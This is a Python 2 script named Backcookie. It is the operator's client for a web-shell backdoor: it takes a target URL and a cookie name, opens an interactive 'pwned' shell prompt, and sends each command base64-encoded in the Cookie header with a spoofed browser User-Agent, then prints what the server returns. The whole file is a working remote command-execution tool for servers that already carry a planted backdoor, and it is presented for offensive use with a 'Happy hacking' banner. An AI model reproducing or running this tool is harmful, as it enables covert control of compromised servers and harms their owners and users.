import os                                     
import sys                                    
import optparse                               
from sys import argv                           
try:
	import requests
except:
	print "Please install requests library, you can do it executing: \n"
	print "pip install requests"
try:
	from whois import extract_domain
except:
	print "Please install whois library, you can do it executing the next command: \n"
	print "pip install whois"

if "linux" in sys.platform:
	os.system("clear")
elif "win" in sys.platform:
	os.system("cls")
else:
    pass

_version_ = "2.0.0"

# colors
class color:
    blue = '\033[94m'
    red = '\033[91m'
    green = '\033[92m'
    white = '\033[0m'
    yellow = '\033[93m'

color = {"blue": "\033[94m", "red": "\033[91m", "green": "\033[92m", "white": "\033[0m", "yellow": "\033[93m"}

# class of header and encode
class Core:
	bc = 'Backcookie'
	ua = 'User-Agent'
	ck = 'Cookie'
	vc = '={0}'
	eb = 'base64'
	
	def Error(self):
		print color["white"] + "\t\t-------------" + color["red"] + self.bc + color["white"] + "------------"
		print "\t\t+             Bad requests              +"
		print "\t\t+             sorry :(            +"
		print "\t\t-----------------------------------\n\n"
		print color["blue"] + "[-] " + color["red"]  + "Error:" +  color["yellow"] + " " + "Connection! \n" + color["white"]
		exit(0)
	
	def backcookie(self, command, host, cookie, vcmd):
		headers = {"User-Agent": "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1", "Cookie": cookie + "=" + command.encode(self.eb)}
		try:
			r = requests.get(host, headers=headers)
			validate = r.headers.values()
			self.url = str(r.url)
			self.url = extract_domain(self.url)
		except:
			self.Error()
		if validate[0] == "0" or vcmd == "command":
			print color["blue"] + r.text.strip() + color["white"]
		else:
			self.Error()

	def shell(self, host, cookie):
		self.backcookie("cd",host,cookie,"")
		print color["white"] + "\t\t-------------" + color["red"] + self.bc + color["white"] + "------------"
		print "\t\t+    @mrjopino and @juan_eljach   +"
		print "\t\t+             To play             +"
		print "\t\t-----------------------------------\n\n"
		print color["green"] + "[+] " + color["blue"]  + "Happy hacking" + color["white"]
		print color["green"] + "[+] " + color["blue"]  + "Sometimes it is not positive, but sometimes if!\n" + color["white"]

		while True:

			command = raw_input(self.url + "@" + "pwned:~$ ")
			if command != "binfo": #Information of conecction!
				self.backcookie(command,host,cookie,"command")
			else:
				print "\n"
				print color["yellow"] + "[*] " + color["green"]  + "Information" + color["white"]
				print color["yellow"] + "[!] " + color["blue"]  + "Target: " + host + color["white"]
				print color["yellow"] + "[!] " + color["blue"]  + "Cookie: " + cookie + color["white"]
				print "\n"

			command = raw_input(self.url + "@" + "pwned:~$ ")
			if command != "exit": #exit console backcookie
				self.backcookie(command,host,cookie,"command")
			else:
				print "\t\t----------------------" + color["blue"] + "Developers" + color["white"] + "------------------"
				print "\t\t+        Jose Pino (Fraph) and Juan Eljach       +"
				print "\t\t+       Security researchers and pythonist       +"
				print "\t\t+             @mrjopino @juan_eljach             +"
				print "\t\t--------------------------------------------------\n\n"
				print color["green"] + "[!] " + color["blue"] + "Version:" + " " + color["yellow"] + _version_ + color["white"]
				print color["blue"] + "[-] " + color["red"] + self.bc + " OFF\n" + color["white"]
				break

def main():
	parser = optparse.OptionParser("python" + " " + "%prog -u <<URL>> -c <<Cookie>>", version="1.0.2")
	parser.add_option('-u', dest="Url", type="string", help="specify hostname to run on")
	parser.add_option('-c', dest="Cookie", type="string", help="specify Cookie")
	(options, args) = parser.parse_args()
	host = options.Url
	cookie = options.Cookie
	if host and cookie:
		connection = Core() 
		connection.shell(host,cookie)
	else:
		parser.print_help()
		exit(0)

if __name__ == "__main__":
        try:
                main()
        except KeyboardInterrupt:
                pass
                ve = (command,Core) #View error of obj
        except Exception as ke:
                print color["red"] + "Error: " + color["blue"] + "%s" % ke + color["white"] #Result of error
